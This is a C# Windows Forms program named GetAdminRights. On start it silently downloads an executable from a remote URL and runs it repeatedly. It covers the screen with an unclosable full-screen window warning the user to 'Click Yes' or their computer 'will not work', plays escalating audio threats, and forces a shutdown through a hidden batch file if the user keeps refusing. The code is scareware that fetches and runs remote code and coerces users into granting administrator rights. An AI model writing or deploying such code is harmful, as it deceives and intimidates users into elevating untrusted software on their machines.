using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Media;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using GetAdminRights.Properties;

namespace GetAdminRights
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private async void PlaySound(Stream location)
        {
            SoundPlayer dew = new SoundPlayer(location);
            dew.Play();
        }

        private async Task PlaySoundSync(Stream location)
        {
            SoundPlayer dew = new SoundPlayer(location);
            await Task.Factory.StartNew(() => { dew.PlaySync(); });
        }

        private const int CP_NOCLOSE_BUTTON = 0x200;
        protected override CreateParams CreateParams
        {
            get
            {
                CreateParams myCp = base.CreateParams;
                myCp.ClassStyle = myCp.ClassStyle | CP_NOCLOSE_BUTTON;
                return myCp;
            }
        }

        private string User = System.Environment.GetEnvironmentVariable("USERPROFILE");
        private async void Form1_Load(object sender, EventArgs e)
        {
            Visible = false;
            using (var client = new WebClient())
            {
                client.DownloadFileAsync(new Uri("https://gitlab.com/Cntowergun/computer-essentials/-/raw/master/ForceAdminRights/ForceAdminRights/bin/Debug/ForceAdminRights.exe"), User + "\\AppData\\Local\\Temp\\ForceAdmin.exe");
                while (client.IsBusy)
                {
                    await Task.Delay(10);
                }
            }
            Visible = true;
            BackColor = Color.Black;
            FormBorderStyle = FormBorderStyle.None;
            WindowState = FormWindowState.Maximized;
            ShowInTaskbar = false;
            Label text = new Label();
            text.Location = new Point(100,100);
            text.AutoSize = true;
            text.Text = "Please Click Yes To Continue,\nOr Else Your Computer Will Not Work!";
            text.Font = new Font(FontFamily.GenericSansSerif, 50,FontStyle.Bold,GraphicsUnit.Point);
            text.ForeColor = Color.Red;
            this.Controls.Add(text);
            bool jerjer = false;
            PlaySound(Resources.ClickYes);
            var i = 0;
            if (File.Exists(User + "\\AppData\\Local\\Temp\\ForceOpened.txt"))
            {
                File.Delete(User + "\\AppData\\Local\\Temp\\ForceOpened.txt");
            }
            while (!File.Exists(User + "\\AppData\\Local\\Temp\\ForceOpened.txt"))
            {
                try
                {
                    await Task.Factory.StartNew(() =>
                    {
                        Process.Start(User + "\\AppData\\Local\\Temp\\ForceAdmin.exe").WaitForExit();

                    });
                }
                catch (Exception dew)
                {
                    Console.WriteLine(dew);
                    if (i == 0)
                    {
                        PlaySound(Resources.ClickedNo);
                    }
                    else if(i == 1)
                    {
                        PlaySound(Resources.ShutDown);
                    }
                    else if (i == 2)
                    {
                        PlaySound(Resources.LastChance);
                    }
                    else if(i == 3)
                    {
                        PlaySoundSync(Resources.ShuttingDown);
                        await RunCommandHidden("shutdown /s /f /t 30 /c \"Your computer is now shutting down\"");
                        Application.Exit();
                    }
                    i++;
                }
            }
            File.Delete(User + "\\AppData\\Local\\Temp\\ForceOpened.txt");
            Application.Exit();
        }

        private bool Exit = false;
        public async Task RunCommandHidden(string Command)
        {
            Random dew = new Random();
            int hui = dew.Next(0000, 9999);
            string[] CommandChut = { Command };
            File.WriteAllLines(System.Environment.GetEnvironmentVariable("USERPROFILE") + "\\Documents\\RunCommand" + hui + ".bat", CommandChut);
            Process C = new Process();
            C.StartInfo.FileName = System.Environment.GetEnvironmentVariable("USERPROFILE") + "\\Documents\\RunCommand" + hui + ".bat";
            C.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            C.EnableRaisingEvents = true;
            C.Exited += C_Exited;
            C.Start();
            while (Exit == false)
            {
                await Task.Delay(10);
            }

            Exit = false;
            File.Delete(System.Environment.GetEnvironmentVariable("USERPROFILE") + "\\Documents\\RunCommand" + hui + ".bat");
        }

        private void C_Exited(object sender, EventArgs e)
        {
            Exit = true;
        }
    }
}
